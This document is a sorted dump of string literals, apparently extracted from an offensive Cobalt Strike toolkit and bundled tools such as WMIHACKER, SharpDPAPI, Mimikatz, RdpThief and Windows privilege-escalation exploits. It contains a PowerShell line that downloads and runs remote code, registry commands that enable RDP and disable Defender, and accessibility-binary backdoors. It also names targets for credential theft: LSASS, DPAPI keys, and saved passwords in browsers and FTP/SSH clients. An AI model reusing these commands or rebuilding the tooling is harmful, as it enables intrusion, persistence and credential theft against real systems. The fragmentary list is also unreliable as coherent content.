"""			      v0.6beta       By. Xiangshan@360RedTeam "
"""/shell"
"""/sid:$3['sid']"
"""/test.dll"
"""/upload"
"""/user:$3['user']"
"""0"
"""00.000000"
"""0123456789ABCDEF"
"""0803.exe cmd  $+ \"
"""0x$('{0:X}' -f $Cast.ImageSize)"
"""1 or 0"
"""100"
"""1000"
"""123,888"
"""123456"
"""127.0.0.1"
"""127.0.0.1:3389"
"""127.0.0.1||127.0.0.1/24"
"""15"
"""192.168.1.0/24"
"""192.168.1.1"
"""192.168.1.1/24"
"""2019-02-19 01:01:01.111"
"""24h:time|12:30"
"""3389"
"""360 SafeBrowser DB Downloading"
"""360bowser.exe /auto"
"""360se6\\Application\\360se.exe"
"""5!Y"
"""6.1"
"""656565"
"""8.8.8.8"
"""80,8080,8001,1433"
"""80-99,443,7001"
"""8080"
"""8888"
""": (.*)"
""":"
"""::| $+ $user $+ : $+ $pass $+ : $+ $permission\"
"""> $+ $fname"
"""A"
"""ADODB.Stream"
"""ATPMiniDump"
"""ATPMiniDump.exe"
"""Action.Path = "
"""Action.arguments = chr(34) & "
"""ActiveScriptEventConsumer"
"""Administrative Session"
"""Alert"
"""An error occurred. Return code: "
"""Arguments"
"""Arguments:  "
"""Arguments:\n"
"""Author"
"""Author:  "
"""Auto Run"
"""BackdoorLNK"
"""Be aware of the default values in this script and change them! (Adobedll.dll, dll.txt)"
"""Beacon:"
"""Bid:"
"""Bin Path: "
"""Binary value added successfully"
"""BrowserGhost"
"""BypassUAC"
"""BypassUac"
"""C:/Users/administrator/Desktop/SharpDPAPI.exe"
"""C:\Documents and Settings\"
"""C:\Users\"
"""C:\Users\$MappedUserName\AppData\Roaming\FileZilla\sitemanager.xml"
"""C:\Users\$MappedUserName\Documents\SuperPuTTY\Sessions.xml"
"""C:\Windows\System32\cmd.exe"
"""C:\Windows\Temp\"
"""C:\\"
"""C:\\123.xlsx"
"""C:\\Progra~1\\Intern~1\\iexplore.exe -k $1"
"""C:\\Users\\$3['user']\\AppData\\Roaming\\SogouExplorer"
"""C:\\Users\\administrator\\Documents\\NetSarang Computer\\7\\Xshell\\Sessions\"
"""C:\\Windows\\System32\\cmd.exe"
"""C:\\Windows\\System32\\cmd.exe\"
"""C:\\Windows\\Temp"
"""C:\\Windows\\Temp\\"
"""C:\\Windows\\Temp\\1.txt"
"""C:\\Windows\\Temp\\123.exe"
"""C:\\Windows\\Temp\\123.exe\"
"""C:\\Windows\\Temp\\payload.exe"
"""C:\\Windows\\WindowsUpdate.log"
"""C:\\Windows\\system32\\cmd.exe"
"""C:\\Windows\\system32\\notepad.exe"
"""C:\\Windows\\temp\\fun.exe"
"""C:\\Windows\\temp\\payload.exe"
"""C:\\\$Recycle.Bin"
"""C:\\payload.exe"
"""C:\\users\\admin\\desktop"
"""C:\\users\\user\\desktop\\Excel.lnk"
"""C:\\windows"
"""C:\\windows\\Temp"
"""C:\\windows\\Temp\\123.txt"
"""C:\\windows\\temp"
"""C:\\windows\\temp\\123.exe"
"""COMPUTERNAME|IPADDRESS"
"""CVE-2019-0803"
"""CVE-2020-0796"
"""Call rootFolder.DeleteTask("
"""Call rootFolder.RegisterTaskDefinition("
"""Call service.Connect"
"""CallBackFile"
"""CallBackFile: "
"""Cannot send message with SYSTEM !"
"""CertUtil Web Delivery (Stageless)"
"""CertUtil Web Delivery"
"""Check Rdp Open Port"
"""Chrome -full"
"""Chrome"
"""Command"
"""Command:  "
"""Comment"
"""Comment: (.*)"
"""Computer|local|hostname|ip"
"""Connecting to target for activities"
"""Connection established for exploitation."
"""Connects to admin session on remote host"
"""Const ActionTypeExec = 0 "
"""Const TriggerTypeDaily = 1 "
"""Copies all DPAPI master keys in the credential store to the clipboard."
"""Copy/Paste One-liner: "
"""Could not find ReflectiveLoader"
"""CreateService"
"""CredPhisher"
"""D:\\xshell\\Xshell\\Sessions"
"""DBPath"
"""DOMAIN\Admin"
"""DPAPI master keys currently in Cobalt Strike's credential store (use these with SharpDPAPI):\n\n"
"""DarkGreen"
"""Debug"
"""DecryptXShell"
"""Default Server Policy"
"""Delay"
"""Delay:  "
"""Df"
"""Digging on"
"""Dim Action"
"""Dim objNet, LoginUser"
"""Dim regInfo"
"""Dim rootFolder"
"""Dim settings"
"""Dim taskDefinition"
"""Dim trigger"
"""Dim triggers"
"""DisableAntiSpyware\"
"""Disabling RdpThief"
"""Does not connect to admin session on remote host"
"""Domain Controllers\"
"""Domain:"
"""DomainIP"
"""DomainInfo"
"""Done!"
"""Drive='C:' AND Path='\\Users\\$MappedUserName\\AppData\\Roaming\\FileZilla\\' AND FileName='sitemanager' AND Extension='XML'"
"""Drive='C:' AND Path='\\Users\\$MappedUserName\\Documents\\SuperPuTTY\\' AND FileName='Sessions' AND Extension='XML'"
"""Drive='C:' AND extension='ppk' OR extension='rdp' OR extension='.sdtid'"
"""DumpLsass"
"""EfsPotato"
"""EnableDotNet"
"""Encryption: (.*)"
"""End Function"
"""End Sub"
"""EventID"
"""EventLog Type:"
"""EventLogType"
"""EventRecordID"
"""Example: spoolsystem inject\n"
"""Example: spoolsystem spawn"
"""Exec: "
"""Exploit"
"""ExtraArgs"
"""Extracts credential manager and vault credentials using SharpDPAPI.  Extracts DPAPI master keys using Mimikatz."
"""Extracts credential manager and vault credentials using SharpDPAPI."
"""FRP"
"""FakeLogonScreen"
"""File Download Success"
"""FileSystem"
"""FileZilla Sessions"
"""FileZilla"
"""FormData3.dat"
"""Foxmail"
"""Fscan"
"""FtpScan"
"""FullPowers"
"""Function Base64Encode(ByVal sText, ByVal fAsUtf16LE)"
"""Function ReadBinary(FileName)"
"""GETRES"
"""GETRES: "
"""GLITTER"
"""GPOName"
"""GPOName:  "
"""Gateway"
"""Get RDP TerminalServices LocalSessionManager EventLog (ID=21&22&24&25)"
"""Get-Content"
"""Get-HotFix"
"""Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run | ft"
"""Get-NetIPAddress -All"
"""Get-NetIPAddress"
"""Get-NetNeighbor"
"""Get-NetRoute"
"""Get-PSDrive"
"""Get-Process -ComputerName"
"""Get-SmbMapping"
"""GetIP"
"""GetInfo"
"""GetPipe"
"""GetStringValue"
"""GetSystem"
"""Gets SYSTEM via spoolss"
"""HH"
"""HH.mm.ss"
"""HKCU"
"""HKCU\\Environment\"
"""HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hello\"
"""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography"
"""HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\"
"""HKEY_USERS\"
"""HKLM"
"""HKLM:\Software\Microsoft\DRM"
"""HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"
"""HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\"
"""HTTP"
"""Hash:"
"""HistoryUrl3.db"
"""Host"
"""HostIP"
"""HostName"
"""Hostname"
"""HttpBasicScan"
"""I-"
"""IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"
"""IFEO"
"""IISpwd"
"""If admin, run \"
"""Injecting into mstsc.exe with PID: $pid"
"""Injecting spooltrigger into PID: "
"""Install"
"""Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS"
"""Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS.\n\n$help"
"""InternalMonologue binary cannot be found at $binary"
"""Invoke-MS16032 -Command \"
"""Invoke-MS16135 -Command \"
"""Invoke-SessionGopher -Thorough"
"""IpAddress"
"""Key: "
"""Keyword"
"""LaZagne"
"""Ladon"
"""Ladon-brute"
"""Launch"
"""LdapScan"
"""Let's enumerate the $3['computername']\n"
"""Let's enumerate the $3['type']\n"
"""Let's enumerate the Recon-AD-Domain\n"
"""Let's enumerate the Recon-AD-SPNs\n"
"""Listener: "
"""Local Host: "
"""Local Port: "
"""LocalSessionManager"
"""LoginUser = objNet.UserName"
"""Logon Scripts"
"""MS14-058"
"""MS15-051"
"""MS16-016"
"""MS16-032"
"""MS16-075"
"""MS16-135"
"""MachineGuid Get Success"
"""MachineGuid"
"""Microsoft RDP Connection Files (.rdp)"
"""Microsoft RDP Sessions"
"""Microsoft Remote Desktop (RDP) Sessions"
"""Microsoft"
"""Microsoft.PowerShell.Core\Registry::"
"""Mimikatz Backup Keys"
"""Mimikatz Credential Manager"
"""Mimikatz DPAPI System Secret"
"""Mimikatz DPAPI"
"""Mimikatz Dump Trust"
"""Mimikatz Kerberos Credentials"
"""Mimikatz LiveSSP passwords"
"""Mimikatz Logon Passwords"
"""Mimikatz MSV LM & NTLM Passwords"
"""Mimikatz SSP passwords"
"""Mimikatz Tickets"
"""Mimikatz TsPkg Passwords"
"""Mimikatz WDigest Credentials"
"""Mimikatz complete. Executing SharpDPAPI"
"""Mimikatz complete. Executing SharpDPAPI..."
"""Mimikatz ekeys"
"""Mimikatz"
"""Mimikatz-pth"
"""MssqlScan"
"""Mstsc"
"""Msxml2.DOMDocument"
"""MysqlScan"
"""NCip"
"""NCpath"
"""NCport"
"""NDP452-KB2901907-x86-x64-AllOS-ENU.exe"
"""NPS"
"""NTLM DCOM->RPC NTLM Reflection (MS16-075)"
"""NTLM hash"
"""Navicat"
"""NetVer"
"""NewLNK"
"""No $arch stager for listener ' $+ $3['listener'] $+ '"
"""No RDP Connections History"
"""No masterkeys found on the current host.\n"
"""No masterkeys found.\n"
"""No"
"""NoAmci"
"""None"
"""Notepad.lnk"
"""Nslookup -type=SRV _ldap._tcp"
"""OKOnly,MsgBoxSetForeground,SystemModal,Exclamation"
"""OSScan"
"""OnlineIP"
"""OnlinePC"
"""Only use plain FTP (insecure)"
"""Open3389"
"""OracleScan"
"""OutFile"
"""PASSWORDS"
"""PATCHME"
"""PPK Files"
"""Part2"
"""Pass"
"""Pass-The-Hash"
"""Password"
"""Path"
"""Permission Denied!"
"""Ping"
"""Please specify an execution method."
"""Port"
"""PrintSpoofer"
"""PrintSpoofer.exe -c \"
"""Private Key Encryption"
"""Private Key"
"""Private MAC"
"""Private-Lines: (.*)"
"""Private-MAC: (.*)"
"""ProfileImagePath"
"""Prompts for Credentials"
"""Protocol"
"""PsInitialSystemProcess"
"""PuTTY Private Key Files (.ppk)"
"""PuTTY Session"
"""PuTTY Sessions"
"""Putty Session"
"""QQ"
"""QQ_\"
"""RDCMan"
"""RDP Files"
"""RDP Sessions"
"""RDP-Tcp PortNumber: "
"""REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\"
"""RSA Tokens (sdtid)"
"""RdpLog"
"""RdpThief enabled \n"
"""RdpThief"
"""Read File To Reg Success"
"""ReadMe"
"""Reading remote file and writing on remote registry"
"""Recent"
"""Recon-AD-AllLocalGroups"
"""Recon-AD-Computers"
"""Recon-AD-Domain"
"""Recon-AD-Groups"
"""Recon-AD-LocalGroups"
"""Recon-AD-SPNs"
"""Recon-AD-Users"
"""ReflectiveDll"
"""Reg unload $Path"
"""Reg"
"""RegAuto"
"""RegAuto-arg"
"""RegItem"
"""RegItem: "
"""RegKey"
"""RegRdpPort"
"""Registration service"
"""Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\eventlog\Security"
"""Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
"""Registry::HKEY_USERS\"
"""Remote -full"
"""Remote Desktop\"
"""Require explicit FTP over TLS"
"""Require implicit FTP over TLS"
"""Res Need Or Not, Use 1 Or 0"
"""Resolve-DnsName"
"""ReverseHttp"
"""ReverseHttps"
"""ReverseTcp"
"""ReverseTcp:"
"""RottenPotato"
"""Run"
"""RunOnce"
"""RunOnceEx"
"""Running final exploit packet"
"""SELECT * FROM CIM_DataFile where name="
"""SELECT * FROM Win32_LocalTime"
"""SELECT * FROM Win32_OperatingSystem"
"""SELECT * FROM Win32_TimeZone"
"""SELECT * FROM __InstanceModificationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
"""SID:"
"""SMB code: "
"""SMB"
"""SOFTWARE\Classes\hello"
"""SOFTWARE\Classes\hello\"
"""SOFTWARE\Martin Prikryl\WinSCP 2\Configuration\Security"
"""SOFTWARE\Microsoft\DRM"
"""SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$SID"
"""SYSTEM"
"""SafetyKatz"
"""SameWeb"
"""Saved in session, but master password prevents plaintext recovery"
"""Schedule.Service"
"""ScriptContents"
"""ScriptContents:  "
"""ScriptName"
"""ScriptName:  "
"""Scripted Web Delivery (CertUtil)"
"""SeImpersonatePrivilege"
"""SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight"
"""Security.evtx"
"""Send the payload with the grooms"
"""SerName"
"""Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f"
"""Server:"
"""Service Name: "
"""SessionGopher ("
"""SessionId"
"""SessionName"
"""Sessions Path:  "
"""Set Action = taskDefinition.Actions.Create(ActionTypeExec)"
"""Set objNet = CreateObject("
"""Set objRegistry = GetObject("
"""Set regInfo = taskDefinition.RegistrationInfo"
"""Set rootFolder = service.GetFolder("
"""Set service = CreateObject("
"""Set settings = taskDefinition.settings"
"""Set taskDefinition = service.NewTask(0)"
"""Set trigger = triggers.Create(7)"
"""Set triggers = taskDefinition.triggers"
"""SetWindowLongPtr"
"""Sethc"
"""Sethc.exe\"
"""SharPersist"
"""SharpAVKB"
"""SharpChassisType"
"""SharpCheckInfo"
"""SharpDPAPI -allkeys\"
"""SharpDPAPI -dump\"
"""SharpDPAPI path not found!"
"""SharpDecryptPwd"
"""SharpDecryptPwd-1"
"""SharpDecryptPwd-2"
"""SharpDirLister"
"""SharpDomainSpray"
"""SharpDump"
"""SharpEventLog"
"""SharpExec"
"""SharpGetTitle"
"""SharpHide"
"""SharpHide-RegAuto"
"""SharpHound3.0"
"""SharpNetCheck"
"""SharpOXID-Find"
"""SharpSCshell"
"""SharpSQLDump"
"""SharpSQLTools"
"""SharpSpray"
"""SharpWeb"
"""SharpWebScan"
"""Sharpstay"
"""Sharptask"
"""Slack -full"
"""Sleep : 111 ms... End !"
"""Sleep : 112 ms... End !"
"""Sleep"
"""Sleep:  "
"""SmbHashScan"
"""SmbScan"
"""Some Service"
"""Source"
"""SpoolSystem Inject"
"""SpoolSystem Spawn"
"""SpoolSystem"
"""SshScan"
"""StartupScript.bat"
"""StateChange: ParsingHeader(cont.)"
"""StateChange: ParsingKeys(cont.)"
"""StateChange: ScanningForHeader"
"""StateChange: ScanningForHeader(cont.)"
"""Status:"
"""StdRegProv"
"""Stealer"
"""Sub WriteBinary(FileName, Buf)"
"""SunLogin"
"""SuperPuTTY Sessions"
"""Sweet Potato"
"""SweetPotato"
"""System.Core"
"""T1134"
"""TCP"
"""TargetDomain"
"""TargetUser"
"""Task Beacon to run "
"""Tasked Beacon to run "
"""Tasked beacon to get SYSTEM via spoolss"
"""Taskname"
"""Taskname:  "
"""TeamViewer"
"""Telemetry"
"""This exploit only supports Windows 10 versions 1903 - 1909"
"""TimeCreated"
"""TomcatScan"
"""TortoiseSVN"
"""Type"
"""Type: "
"""Type:"
"""URI Path: "
"""Update"
"""UploadPath"
"""UrlScan"
"""Usage: "
"""Use FTP over TLS if available"
"""Use SFTP"
"""Use x64 payload"
"""Use: sharpDPAPI [-dump] [-allkeys]\n"
"""Use: sharpDPAPI_masterkeysToClipboard\n\n"
"""Use: spoolsystem <method>\n\n"
"""UseMasterPassword"
"""User Data\\Default\\apps\\LoginAssis\\assis2.db"
"""User"
"""User:"
"""UserAccount"
"""UserAccount:  "
"""UserName"
"""UserNameHint"
"""UserRights"
"""UserRights:  "
"""Username"
"""UsernameHint"
"""Uses named pipe impersonation to gain SYSTEM via Print Spooler.\n\n"
"""Utilman"
"""Utilman.exe\"
"""VALUE Base64 encoded command to execute"
"""VncScan"
"""WMIEventSub"
"""WMIHACKER : CMD > "
"""WMIHACKER : COMMAND EXEC SUCCESS, Wait to write in reg."
"""WMIHACKER : COMMAND EXEC SUCCESS."
"""WMIHACKER : COMMAND EXECTING... "
"""WMIHACKER : Connecting..."
"""WMIHACKER : Done. Task created Wait For Exec...(Max Time is 00:59)"
"""WMIHACKER : Error on task creation"
"""WMIHACKER : File Upload Success. "
"""WMIHACKER : File Write Success. "
"""WMIHACKER : Login -> OK"
"""WMIHACKER : REG WRITE SUCCESS, Wait to read the res."
"""WMIHACKER : Target -> "
"""WMIHACKER : Task created Wait For Exec...(Max Time is 00:59)"
"""WMIHACKER : The Schedule Name is "
"""WMIHACKER : Welcome to WMIHACKER Shell"
"""WMIHACKER ERROR: "
"""WMIHACKER"
"""WMIHACKER.vbs  /cmd  host  user  pass  command GETRES?"
"""WMIHACKER.vbs  /download  host  user  pass  localpath remotepath"
"""WMIHACKER.vbs  /shell  host  user  pass "
"""WMIHACKER.vbs  /upload  host  user  pass  localpath remotepath"
"""WMIHACKER_cmd"
"""WMIHACKER_download"
"""WMIHACKER_shell"
"""WMIHACKER_upload"
"""WQL"
"""WScript.Network"
"""Watson"
"""WbemScripting.SWbemNamedValueSet"
"""WebScan"
"""WeblogicScan"
"""WhatCMS"
"""Win32_ScheduledJob"
"""WinSCP Sessions"
"""WinSCP"
"""Windows 10 versions 1903 - 1909"
"""Windows COM Config Consumer"
"""Windows COM Config Filter"
"""Windows NT"
"""Windows PowerShell\"
"""WindowsUpdate"
"""Winlogon"
"""WmiHashScan"
"""WmiScan"
"""WriteBinary "
"""Xmanager"
"""Yes"
"""You need to be an administrator."
"""[!] $Thread is a bad thread, moving on.."
"""[!] No valid thread handles were captured, exiting!"
"""[!] NtImpersonateThread failed, moving on.."
"""[!] OpenThreadToken failed, moving on.."
"""[!] Sending command to the elevated child"
"""[!] SetThreadToken failed, moving on.."
"""[!] This is a VM isn't it, race condition requires at least 2 CPU cores, exiting!`n"
"""[!]Fail to load Hive"
"""[!]No RDP Connections History"
"""[!]Not logged in"
"""[*]Try to load Hive"
"""[*]Try to unload Hive"
"""[+] "
"""[+] Bitmap dimensions: 0x760*0x4`n"
"""[+] Bitmap dimensions: 0x770*0x4`n"
"""[+] Child PID is : $("
"""[+] Corrupting child window spmenu"
"""[+] Distance: 0x$('{0:X}' -f $Distance)"
"""[+] Importing:"
"""[+] Manager : $('{0:X}' -f $ManagerBitmap.BitmapKernelObj)"
"""[+] New manager bitmap pvScan0: $('{0:X}' -f $pvScan0)"
"""[+] Old manager bitmap pvScan0: $('{0:X}' -f $pvScan0)"
"""[+] PID: $(Bitmap-Read -Address $($SysEPROCESS+$UniqueProcessIdOffset))"
"""[+] PID: $NextPID"
"""[+] Ping from child, voila"
"""[+] PowerShell Token: 0x$("
"""[+] PowerShell _EPROCESS address: 0x$("
"""[+] Resuming thread.."
"""[+] SYSTEM Token: 0x$("
"""[+] SYSTEM _EPROCESS address: 0x$("
"""[+] Thread resumed!"
"""[+] Thread suspended"
